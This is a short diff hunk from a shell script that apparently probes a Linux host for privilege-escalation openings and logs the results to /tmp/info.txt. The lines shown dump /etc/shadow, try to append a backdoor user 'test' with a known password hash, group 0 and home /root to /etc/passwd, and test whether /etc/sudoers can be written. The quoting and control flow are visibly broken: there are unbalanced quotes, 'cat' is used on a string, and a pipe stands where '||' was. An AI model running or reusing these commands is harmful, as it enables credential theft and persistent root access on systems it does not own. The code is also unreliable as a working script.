@@ -18,7 +18,7 @@ echo 'SHADOW?'  >> /tmp/info.txt
 cat /etc/shadow || echo 'can not cat shadow file' >> /tmp/info.txt
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE PASSWD?' >> /tmp/info.txt
-cat 'test: $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash >> /etc/passwd && echo 'yup – password = hashcat user = test' || echo 'nope' 
+cat 'test: $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash >> /etc/passwd && echo 'yup – password = hashcat user = test' | echo 'nope' >> /tmp/info.txt 
 echo '------------------------------------------------------------------------------' >> /tmp/info.txt
 echo 'WRITE SUDOERS FILE?' >> /tmp/info.txt
 echo #test >> /etc/sudoers && echo 'yup' >> /tmp/info.txt | echo 'nope' >> /tmp/info.txt
